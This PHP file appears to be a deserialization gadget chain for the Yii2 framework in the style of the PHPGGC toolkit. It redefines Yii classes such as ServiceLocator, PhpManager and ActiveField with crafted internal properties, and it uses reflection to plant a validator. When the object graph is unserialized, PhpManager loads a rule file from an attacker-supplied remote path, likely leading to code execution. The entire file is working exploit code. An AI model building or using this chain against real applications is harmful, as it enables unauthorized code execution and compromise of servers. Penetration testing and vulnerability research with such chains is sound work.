<?php

namespace yii\base
{
    class Component
    {
        private $_events = [];
        private $_eventWildcards = [];
        private $_behaviors = null;
    }

    class Model extends Component
    {
        private $_errors = null;
        private $_validators;
    }

    class DynamicModel extends Model
    {
        private $_attributes = ['t' => 'v'];
    }
}

namespace yii\di
{
    class ServiceLocator extends \yii\base\Component
    {
        private $_components;
        private $_definitions;

        public function __construct($remote_path)
        {
            $this->_components = [];
            $this->_definitions = [
                'enableClientScript' => new \stdClass(),
                'enableAjaxValidation' => [
                    'class' => 'yii\rbac\PhpManager',
                    'itemFile' => '/__phpggc_nonexistent_items__',
                    'assignmentFile' => '/__phpggc_nonexistent_assignment__',
                    'ruleFile' => $remote_path,
                ],
                'attributes' => [
                    'class' => 'yii\web\CookieCollection',
                ],
                'validationStateOn' => new \stdClass(),
            ];
        }
    }
}

namespace yii\rbac
{
    class PhpManager extends \yii\base\Component
    {
        public $itemFile;
        public $assignmentFile;
        public $ruleFile;
    }
}

namespace yii\validators
{
    class Validator extends \yii\base\Component
    {
        public $attributes = ['t'];
        public $enableClientValidation = false;
        public $when = true;
    }

    class RequiredValidator extends Validator
    {
    }
}

namespace yii\widgets
{
    class ActiveField
    {
        public $form;
        public $model;
        public $attribute = 't';
        public $parts = [
            '{input}' => 'IN',
            '{label}' => 'LA',
            '{error}' => 'ER',
            '{hint}' => 'HI',
        ];
        public $template = '{input}';
        public $enableClientValidation = false;
        public $enableAjaxValidation = null;
        public $validateOnChange = true;
        public $validateOnBlur = true;
        public $validateOnType = false;
        public $validationDelay = 500;
        public $selectors = [];
        public $errorOptions = ['class' => 'help-block'];
        public $addAriaAttributes = true;

        public function __construct($form, $model)
        {
            $this->form = $form;
            $this->model = $model;

            $model_reflection = new \ReflectionClass('yii\base\Model');
            $validators = $model_reflection->getProperty('_validators');
            if (PHP_VERSION_ID < 80100) {
                $validators->setAccessible(true);
            }
            $validators->setValue($model, [new \yii\validators\RequiredValidator()]);
        }
    }
}
